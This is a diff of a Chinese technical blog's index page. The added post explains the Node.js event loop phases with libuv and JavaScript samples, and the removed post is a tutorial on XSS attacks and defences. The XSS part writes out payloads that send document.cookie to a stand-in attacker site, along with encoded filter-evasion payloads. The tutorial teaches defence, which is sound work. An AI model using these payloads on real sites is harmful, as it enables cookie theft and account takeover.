+<p><strong>注意，上图的EVENT_QUEUE 给人看起来是只有一个队列, 根据Node.js官方介绍, EventLoop有6个阶段, 同时每个阶段都有对应的一个先进先出的回调队列.</strong></p>
+<h3 id="什么是事件循环-EventLoop"><a href="#什么是事件循环-EventLoop" class="headerlink" title="什么是事件循环(EventLoop) ?"></a>什么是事件循环(EventLoop) ?</h3><blockquote>
+<p>In computer science, the event loop, message dispatcher, message loop, message pump, or run loop is a programming construct that waits for and dispatches events or messages in a program. – <a href="https://en.wikipedia.org/wiki/Event_loop" target="_blank" rel="noopener">from wiki</a></p>
+</blockquote>
+<p><strong>大概含义: EventLoop 是一种常用的机制，通过对内部或外部的事件提供者发出请求, 如文件读写, 网络连接 等异步操作, 完成后调用事件处理程序. 整个过程都是异步阶段</strong></p>
+<h3 id="Node-js的事件循环机制"><a href="#Node-js的事件循环机制" class="headerlink" title="Node.js的事件循环机制"></a>Node.js的事件循环机制</h3><blockquote>
+<p>When Node.js starts, it initializes the event loop, processes the provided input script (or drops into the REPL, which is not covered in this document) which may make async API calls, schedule timers, or call process.nextTick(), then begins processing the event loop. – from <a href="https://github.com/nodejs/node/blob/v6.x/doc/topics/event-loop-timers-and-nexttick.md" target="_blank" rel="noopener">node.js doc</a></p>
+</blockquote>
+<p><strong>大致含义: 当Node.js 启动, 就会初始化一个 event loop, 处理脚本时, 可能会发生异步API行为调用, 使用定时器任务或者nexTick, 处理完成后进入事件循环处理过程</strong></p>
+<h3 id="事件循环阶段"><a href="#事件循环阶段" class="headerlink" title="事件循环阶段"></a>事件循环阶段</h3><p><a href="https://en.wikipedia.org/wiki/Node.js" target="_blank" rel="noopener">Node.js</a>采用V8作为js的解析引擎，而I/O处理方面使用了自己设计的libuv，libuv是一个基于事件驱动的跨平台抽象层，封装了不同操作系统一些底层特性，对外提供统一的API，事件循环机制也是它里面的实现<a href="https://github.com/libuv/libuv/blob/v1.x/src/unix/core.c#L348-L397" target="_blank" rel="noopener">核心源码参考</a>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">int uv_run(uv_loop_t* loop, uv_run_mode mode) &#123;</span><br><span class="line">  int timeout;</span><br><span class="line">  int r;</span><br><span class="line">  int ran_pending;</span><br><span class="line"></span><br><span class="line">  r = uv__loop_alive(loop);</span><br><span class="line">  if (!r)</span><br><span class="line">    uv__update_time(loop);</span><br><span class="line"></span><br><span class="line">  while (r != 0 &amp;&amp; loop-&gt;stop_flag == 0) &#123;</span><br><span class="line">    uv__update_time(loop);</span><br><span class="line">    // timers阶段</span><br><span class="line">    uv__run_timers(loop);</span><br><span class="line">    // I/O callbacks阶段</span><br><span class="line">    ran_pending = uv__run_pending(loop);</span><br><span class="line">    // idle阶段</span><br><span class="line">    uv__run_idle(loop);</span><br><span class="line">    // prepare阶段</span><br><span class="line">    uv__run_prepare(loop);</span><br><span class="line"></span><br><span class="line">    timeout = 0;</span><br><span class="line">    if ((mode == UV_RUN_ONCE &amp;&amp; !ran_pending) || mode == UV_RUN_DEFAULT)</span><br><span class="line">      timeout = uv_backend_timeout(loop);</span><br><span class="line">    // poll阶段</span><br><span class="line">    uv__io_poll(loop, timeout);</span><br><span class="line">    // check阶段</span><br><span class="line">    uv__run_check(loop);</span><br><span class="line">    // close callbacks阶段</span><br><span class="line">    uv__run_closing_handles(loop);</span><br><span class="line"></span><br><span class="line">    if (mode == UV_RUN_ONCE) &#123;</span><br><span class="line">      uv__update_time(loop);</span><br><span class="line">      uv__run_timers(loop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = uv__loop_alive(loop);</span><br><span class="line">    if (mode == UV_RUN_ONCE || mode == UV_RUN_NOWAIT)</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (loop-&gt;stop_flag != 0)</span><br><span class="line">    loop-&gt;stop_flag = 0;</span><br><span class="line"></span><br><span class="line">  return r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>根据<a href="https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/" target="_blank" rel="noopener">Node.js</a>官方介绍，每次事件循环都包含了6个阶段，对应到 libuv 源码中的实现，如下图所示</p>
+<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/node-libuv_180703.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   ┌───────────────────────┐</span><br><span class="line">┌─&gt;│        timers         │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">│  │     I/O callbacks     │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">│  │     idle, prepare     │</span><br><span class="line">│  └──────────┬────────────┘      ┌───────────────┐</span><br><span class="line">│  ┌──────────┴────────────┐      │   incoming:   │</span><br><span class="line">│  │         poll          │&lt;─────┤  connections, │</span><br><span class="line">│  └──────────┬────────────┘      │   data, etc.  │</span><br><span class="line">│  ┌──────────┴────────────┐      └───────────────┘</span><br><span class="line">│  │        check          │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">└──┤    close callbacks    │</span><br><span class="line">   └───────────────────────┘</span><br></pre></td></tr></table></figure>
+<p><strong>每一个阶段都有一个FIFO的callbacks队列, 每个阶段都有自己的事件处理方式. 当事件循环进入某个阶段时, 将会在该阶段内执行回调，直到队列耗尽或者回调的最大数量已执行, 那么将进入下一个处理阶段.</strong></p>
+<ul>
+<li><strong>timers</strong> 阶段: 这个阶段执行setTimeout(callback) and setInterval(callback)预定的callback;</li>
+<li><strong>I/O callbacks</strong> 阶段: 执行除了close事件的callbacks、被timers(定时器，setTimeout、setInterval等)设定的callbacks、setImmediate()设定的callbacks之外的callbacks; (目前这个阶段)</li>
+<li><strong>idle, prepare</strong> 阶段: 仅node内部使用;</li>
+<li><strong>poll</strong> 阶段: 获取新的I/O事件, 适当的条件下node将阻塞在这里;</li>
+<li><strong>check</strong> 阶段: 执行setImmediate() 设定的callbacks;</li>
+<li><strong>close callbacks</strong> 阶段: 比如socket.on(‘close’, callback)的callback会在这个阶段执行.</li>
+</ul>
+<h4 id="timers阶段"><a href="#timers阶段" class="headerlink" title="timers阶段"></a><strong>timers阶段</strong></h4><p>一个timer指定一个下限时间而不是准确时间，在达到这个下限时间后执行回调。在指定时间过后，timers会尽可能早地执行回调，但系统调度或者其它回调的执行可能会延迟它们。</p>
+<p>注意：技术上来说，poll 阶段控制 timers 什么时候执行。</p>
+<p>注意：这个下限时间有个范围：[1, 2147483647]，如果设定的时间不在这个范围，将被设置为1。</p>
+<h4 id="I-O-callbacks阶段"><a href="#I-O-callbacks阶段" class="headerlink" title="I/O callbacks阶段"></a><strong>I/O callbacks阶段</strong></h4><p>这个阶段执行一些系统操作的回调。比如TCP错误，如一个TCP socket在想要连接时收到ECONNREFUSED,<br>类unix系统会等待以报告错误，这就会放到 I/O callbacks 阶段的队列执行.<br>名字会让人误解为执行I/O回调处理程序, 实际上I/O回调会由poll阶段处理.</p>
+<h4 id="poll阶段"><a href="#poll阶段" class="headerlink" title="poll阶段"></a><strong>poll阶段</strong></h4><p>poll 阶段有两个主要功能：</p>
+<p>执行下限时间已经达到的timers的回调，然后<br>处理 poll 队列里的事件。<br>当event loop进入 poll 阶段，并且 没有设定的timers（there are no timers scheduled），会发生下面两件事之一：</p>
+<p>如果 poll 队列不空，event loop会遍历队列并同步执行回调，直到队列清空或执行的回调数到达系统上限；</p>
+<p>如果 poll 队列为空，则发生以下两件事之一：</p>
+<ol>
+<li>如果代码已经被setImmediate()设定了回调, event loop将结束 poll 阶段进入 check 阶段来执行 check 队列（里的回调）。</li>
+<li>如果代码没有被setImmediate()设定回调，event loop将阻塞在该阶段等待回调被加入 poll 队列，并立即执行。</li>
+</ol>
+<p>但是，当event loop进入 poll 阶段，并且 有设定的timers，一旦 poll 队列为空（poll 阶段空闲状态）：</p>
+<ol>
+<li>event loop将检查timers,如果有1个或多个timers的下限时间已经到达，event loop将绕回 <strong>timers</strong> 阶段，并执行 <strong>timer</strong>队列。</li>
+</ol>
+<h3 id="check阶段"><a href="#check阶段" class="headerlink" title="check阶段"></a><strong>check阶段</strong></h3><p>这个阶段允许在 poll 阶段结束后立即执行回调。如果 poll 阶段空闲，并且有被setImmediate()设定的回调，event loop会转到 check 阶段而不是继续等待。</p>
+<p>setImmediate()实际上是一个特殊的timer，跑在event loop中一个独立的阶段。它使用libuv的API<br>来设定在 poll 阶段结束后立即执行回调。</p>
+<p>通常上来讲，随着代码执行，event loop终将进入 poll 阶段，在这个阶段等待 incoming connection, request 等等。但是，只要有被setImmediate()设定了回调，一旦 poll 阶段空闲，那么程序将结束 poll 阶段并进入 check 阶段，而不是继续等待 poll 事件们 （poll events）。</p>
+<h3 id="close-callbacks-阶段"><a href="#close-callbacks-阶段" class="headerlink" title="close callbacks 阶段"></a><strong>close callbacks 阶段</strong></h3><p>如果一个 socket 或 handle 被突然关掉（比如 socket.destroy()），close事件将在这个阶段被触发，否则将通过process.nextTick()触发</p>
+<p><strong>简单的 EventLoop</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&apos;fs&apos;);</span><br><span class="line">let counts = 0;</span><br><span class="line"></span><br><span class="line">function wait (mstime) &#123;</span><br><span class="line">  let date = Date.now();</span><br><span class="line">  while (Date.now() - date &lt; mstime) &#123;</span><br><span class="line">    // do nothing</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function asyncOperation (callback) &#123;</span><br><span class="line">  fs.readFile(__dirname + &apos;/&apos; + __filename, callback);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const lastTime = Date.now();</span><br><span class="line"></span><br><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">  console.log(&apos;timers&apos;, Date.now() - lastTime + &apos;ms&apos;);</span><br><span class="line">&#125;, 0);</span><br><span class="line"></span><br><span class="line">process.nextTick(() =&gt; &#123;</span><br><span class="line">  // 进入event loop</span><br><span class="line">  // timers阶段之前执行</span><br><span class="line">  wait(20);</span><br><span class="line">  asyncOperation(() =&gt; &#123;</span><br><span class="line">    console.log(&apos;poll&apos;);</span><br><span class="line">  &#125;);  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * result:</span><br><span class="line"> * timers 21ms</span><br><span class="line"> * poll</span><br><span class="line"> */</span><br></pre></td></tr></table></figure>
+<p>为了让<code>setTimeout</code>优先于<code>fs.readFile</code> 回调, 执行了process.nextTick, 表示在进入 timers阶段前, 等待20ms后执行文件读取.</p>
+<h3 id="nextTick-与-setImmediate"><a href="#nextTick-与-setImmediate" class="headerlink" title="nextTick 与 setImmediate"></a>nextTick 与 setImmediate</h3><p>process.nextTick 不属于事件循环的任何一个阶段，它属于该阶段与下阶段之间的过渡, 即本阶段执行结束, 进入下一个阶段前, 所要执行的回调。有给人一种插队的感觉.</p>
+<p>setImmediate的回调处于check阶段, 当poll阶段的队列为空, 且check阶段的事件队列存在的时候，切换到check阶段执行.</p>
+<p><strong>nextTick 递归的危害</strong><br>由于nextTick具有插队的机制，nextTick的递归会让事件循环机制无法进入下一个阶段. 导致I/O处理完成或者定时任务超时后仍然无法执行, 导致了其它事件处理程序处于饥饿状态. 为了防止递归产生的问题, Node.js 提供了一个 process.maxTickDepth (默认 1000)。</p>
+<p>递归nextTick</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&apos;fs&apos;);</span><br><span class="line">let counts = 0;</span><br><span class="line"></span><br><span class="line">function wait (mstime) &#123;</span><br><span class="line">  let date = Date.now();</span><br><span class="line">  while (Date.now() - date &lt; mstime) &#123;</span><br><span class="line">    // do nothing</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function nextTick () &#123;</span><br><span class="line">  process.nextTick(() =&gt; &#123;</span><br><span class="line">    wait(20);</span><br><span class="line">    nextTick();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const lastTime = Date.now();</span><br><span class="line"></span><br><span class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">  console.log(&apos;timers&apos;, Date.now() - lastTime + &apos;ms&apos;);</span><br><span class="line">&#125;, 0);</span><br><span class="line"></span><br><span class="line">nextTick();</span><br></pre></td></tr></table></figure>
+<p>此时永远无法跳到timer阶段, 因为在进入timers阶段前有不断的nextTick插入执行. 除非执行了1000次到了执行上限.</p>
+<p><strong>setImmediate</strong><br>如果在一个I/O周期内进行调度，setImmediate（）将始终在任何定时器之前执行.</p>
+<h3 id="setTimeout-与-setImmediate"><a href="#setTimeout-与-setImmediate" class="headerlink" title="setTimeout 与 setImmediate"></a>setTimeout 与 setImmediate</h3><ul>
+<li>setImmediate()被设计在 poll 阶段结束后立即执行回调；</li>
+<li>setTimeout()被设计在指定下限时间到达后执行回调;</li>
+</ul>
+<p>无 I/O 处理情况下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(function timeout () &#123;</span><br><span class="line">  console.log(&apos;timeout&apos;);</span><br><span class="line">&#125;,0);</span><br><span class="line"></span><br><span class="line">setImmediate(function immediate () &#123;</span><br><span class="line">  console.log(&apos;immediate&apos;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>输出结果是 不确定 的！</strong><br>setTimeout(fn, 0) 具有几毫秒的不确定性. 无法保证进入timers阶段, 定时器能够立即执行处理程序.</p>
+<p>在I/O事件处理程序下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var fs = require(&apos;fs&apos;)</span><br><span class="line"></span><br><span class="line">fs.readFile(__filename, () =&gt; &#123;</span><br><span class="line">  setTimeout(() =&gt; &#123;</span><br><span class="line">    console.log(&apos;timeout&apos;)</span><br><span class="line">  &#125;, 0)</span><br><span class="line">  setImmediate(() =&gt; &#123;</span><br><span class="line">    console.log(&apos;immediate&apos;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>此时 <code>setImmediate</code> 优先于 <code>setTimeout</code> 执行，因为 poll阶段执行完成后 进入 check阶段. timers阶段处于下一个事件循环阶段了.</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://segmentfault.com/a/1190000012258592" target="_blank" rel="noopener">https://segmentfault.com/a/1190000012258592</a><br><a href="http://lynnelv.github.io/js-event-loop-nodejs" target="_blank" rel="noopener">http://lynnelv.github.io/js-event-loop-nodejs</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
         <time datetime="2017-09-11T14:16:53.000Z"><a href="/2017/09/11/Node.js_IO/深入理解Node.js中Stream内部机制/">2017-09-11</a></time>
       
       
@@ -919,272 +1153,6 @@
 
 
 
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-02-18T06:45:23.000Z"><a href="/2017/02/18/网络安全/XSS攻击及预防/">2017-02-18</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2017/02/18/网络安全/XSS攻击及预防/">XSS攻击及预防</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h2 id="XSS攻击是什么"><a href="#XSS攻击是什么" class="headerlink" title="XSS攻击是什么"></a>XSS攻击是什么</h2><ul>
-<li>XSS又称CSS，全称Cross SiteScript跨站脚本攻击的缩写，是一种网站应用程序的安全漏洞攻击，是代码注入的一种。</li>
-<li>通常是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</li>
-<li>这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。</li>
-<li>攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和盗取用户Cookie、破坏页面结构、重定向到其它网站等</li>
-</ul>
-<h3 id="XSS攻击基本原理——代码注入"><a href="#XSS攻击基本原理——代码注入" class="headerlink" title="XSS攻击基本原理——代码注入"></a>XSS攻击基本原理——代码注入</h3><p>在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击——将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。<br>历史悠久的<code>SQL注入</code>和<code>XSS注入</code>都是这种攻击方式的典范。现如今，随着参数化查询的普及，我们已经离<code>SQL注入</code>很远了。但是，历史同样悠久的<code>XSS</code>却没有远离我们。<br><code>XSS</code>的基本实现思路很简单——比如<code>持久型XSS</code>通过一些正常的站内交互途径，例如发布评论，提交含有<code>JavaScript</code>的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。</p>
-<p>攻击分类举例</p>
-<h3 id="DOM-based-XSS"><a href="#DOM-based-XSS" class="headerlink" title="DOM-based XSS"></a>DOM-based XSS</h3><p>基于DOM的XSS，通过对具体DOM代码进行分析，根据实际情况构造dom节点进行XSS跨站脚本攻击，该攻击特点是中招的人是少数人。<br><strong>场景一</strong>：<br>当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEhtmlPUBLIC"-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   页面内容：<span class="tag">&lt;<span class="name">%=request.getParameter("content")%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：<a href="http://www.a.com?content=" target="_blank" rel="noopener">http://www.a.com?content=</a><script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=<script>alert(“xss”)</script>，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？</p>
-<h3 id="持久型XSS"><a href="#持久型XSS" class="headerlink" title="持久型XSS"></a>持久型XSS</h3><p>也叫存储型XSS——主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。可以描述为:恶意用户的HTML或JS输入服务器-&gt;进入数据库-&gt;服务器响应时查询数据库-&gt;用户浏览器。</p>
-<p><strong>场景二</strong>：<br>a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。Stored XSS漏洞危害性更大，危害面更广。</p>
-<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射性XSS，也就是被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。<br>URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
-<h3 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h3><ul>
-<li><p>输入过滤，所有用户输入都是不可信的。”（注意: 攻击代码不一定在<script></script>中），对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据。</p>
-<p>| less-than character (&lt;)                                      | &lt;                                                     |<br>| ———————————————————— | ——————————————————– |<br>| greater-than character (&gt;)                                   | &gt;                                                     |<br>| ampersand character (&amp;)                                      | &amp;                                                    |<br>| double-quote character (“)                                   | &quot;                                                   |<br>| space character( )                                           | &nbsp;                                                   |<br>| Any ASCII code character whose code is greater-than or equal to 0x80 | &amp;#<number>, where <number> is the ASCII character value. |</number></number></p>
-</li>
-</ul>
-<p>比如用户输入：<script>window.location.href=”<a href="http://www.baidu.com”">http://www.baidu.com”</a>;</script>，保存后最终存储的会是&lt;script&gt;window.location.href=&quot;<a href="http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。" target="_blank" rel="noopener">http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</a></p>
-<ul>
-<li>输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到<script>中，可以进行JS编码。</li>
-</ul>
-<h3 id="使用-HttpOnly-Cookie"><a href="#使用-HttpOnly-Cookie" class="headerlink" title="使用 HttpOnly Cookie"></a>使用 HttpOnly Cookie</h3><p>将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上<code>cookie</code>字段，但是在<code>js</code>脚本中却不能访问这个cookie，这样就避免了XSS攻击利用<code>JavaScript</code>的<code>document.cookie</code>获取<code>cookie</code>。</p>
-<h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><p>单篇说</p>
-<h3 id="困难和幸运"><a href="#困难和幸运" class="headerlink" title="困难和幸运"></a>困难和幸运</h3><p>过滤 Html 标签能否防止 XSS? 请列举不能的情况?</p>
-<p>用户除了上传</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>还可以使用图片 url 等方式来上传脚本进行攻击</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>还可以使用各种方式来回避检查, 例如空格, 回车, Tab</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas cript:</span><br><span class="line">alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>还可以通过各种编码转换 (URL 编码, Unicode 编码, HTML 编码, ESCAPE 等) 来绕过检查</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%20src=%22javascript:alert(&apos;xss&apos;);%22&gt;</span><br><span class="line">&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>真正麻烦的是，在一些场合我们要允许用户输入HTML，又要过滤其中的脚本。这就要求我们对代码小心地进行转义。否则，我们可能既获取不了用户的正确输入，又被XSS攻击。<br>幸好，由于XSS臭名昭著历史悠久又极其危险，现代web开发框架如<code>vue.js</code>、<code>react.js</code>等，在设计的时候就考虑了XSS攻击对html插值进行了更进一步的抽象、过滤和转义，我们只要熟练正确地使用他们，就可以在大部分情况下避免XSS攻击。<br>同时，许多基于<code>MVVM</code>框架的<code>SPA</code>（单页应用）不需要刷新URL来控制view，这样大大防止了XSS隐患。另外，我们还可以用一些防火墙来阻止XSS的运行。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/ghsau/article/details/17027893">https://blog.csdn.net/ghsau/article/details/17027893</a></p>
-<p><a href="https://www.imooc.com/article/13553">https://www.imooc.com/article/13553</a></p>
-<p><a href="https://blog.csdn.net/u011781521/article/details/53894399">https://blog.csdn.net/u011781521/article/details/53894399</a></p>
-<p><a href="https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss">https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss</a></p>
-</script></li></ul>
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-02-16T06:45:23.000Z"><a href="/2017/02/16/网络安全/CSRF攻击及预防/">2017-02-16</a></time>
